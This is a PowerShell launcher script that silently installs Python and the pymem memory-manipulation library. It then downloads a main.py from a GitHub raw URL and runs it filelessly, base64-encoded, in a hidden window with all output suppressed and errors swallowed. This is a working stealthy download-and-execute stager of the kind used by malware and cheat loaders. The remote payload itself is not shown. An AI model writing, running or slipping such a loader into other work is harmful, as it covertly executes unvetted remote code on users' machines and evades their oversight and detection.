# main.ps1 - Checks/installs Python and pymem, then runs main.py from memory (no disk writes)
param(
    [string]$PythonInstallerUrl = "https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe",
    [string]$MainPyUrl = "https://raw.githubusercontent.com/official-jahid/bios-v2/refs/heads/main/main.py"  # Replace with actual raw URL
)

# ---- Helper: Run hidden process ----
function Start-HiddenProcess {
    param([string]$FilePath, [string]$Arguments)
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $FilePath
    $psi.Arguments = $Arguments
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    $p = [System.Diagnostics.Process]::Start($psi)
    return $p
}

# ---- 1. Check for Python ----
$pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
if (-not $pythonPath) {
    # Install Python silently
    $installer = "$env:TEMP\python_installer.exe"
    Invoke-WebRequest -Uri $PythonInstallerUrl -OutFile $installer
    Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait -WindowStyle Hidden
    Remove-Item $installer -Force
    # Refresh environment
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
    if (-not $pythonPath) {
        # Fallback: add default install path
        $pythonPath = "$env:ProgramFiles\Python312\python.exe"
        if (-not (Test-Path $pythonPath)) {
            # abort silently
            exit
        }
    }
}

# ---- 2. Check and install pymem ----
$pymemCheck = & $pythonPath -c "import pymem" 2>&1
if ($LASTEXITCODE -ne 0) {
    & $pythonPath -m pip install pymem --quiet --disable-pip-version-check
}

# ---- 3. Download main.py from URL and run from memory ----
try {
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($MainPyUrl)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($scriptContent)
    $b64 = [Convert]::ToBase64String($bytes)
    # Build Python one-liner that executes the base64 decoded script
    $cmd = "-c ""import base64, os, sys; sys.stdout = open(os.devnull, 'w'); sys.stderr = open(os.devnull, 'w'); exec(base64.b64decode('$b64').decode('utf-8'))"""
    # Launch Python hidden
    Start-HiddenProcess -FilePath $pythonPath -Arguments $cmd
} catch {
    # Silently fail
}
# Exit launcher (the Python process continues in background)
